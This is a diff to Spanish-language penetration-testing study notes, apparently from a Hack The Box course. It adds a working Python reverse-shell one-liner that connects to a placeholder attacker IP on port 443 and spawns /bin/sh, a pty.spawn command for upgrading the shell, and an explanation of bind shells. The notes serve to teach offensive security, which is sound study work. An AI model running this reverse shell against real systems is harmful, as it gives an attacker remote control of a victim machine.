@@ -241,6 +241,23 @@ PS C:\Users\htb-student> whoami
 ws01\htb-student
 ```
 
+****
+
+Ejemplo de una reverse shell con Python:
+
+```python
+python -c '
+	import socket,subprocess,os;
+	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+	s.connect(("<IP_ATACANTE>",443));
+	os.dup2(s.fileno(),0); 
+	os.dup2(s.fileno(),1); 
+	os.dup2(s.fileno(),2);
+	p=subprocess.call(["/bin/sh","-i"]);
+'
+```
+
+Podemos obtener una TTY funcional con python de forma sencilla con `python -c 'import pty; pty.spawn("/bin/bash")'`
 ### 2. Bind Shell
 
 Esta técnica es el opuesto de la Reverse Shell, ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quien se conecta a la máquina comprometida. El atacante escucha en un puerto determinado y la máquina comprometida acepta la conexión entrante en ese puerto. El atacante luego tiene acceso por consola a la máquina comprometida, lo que le permite tomar el control de la misma.
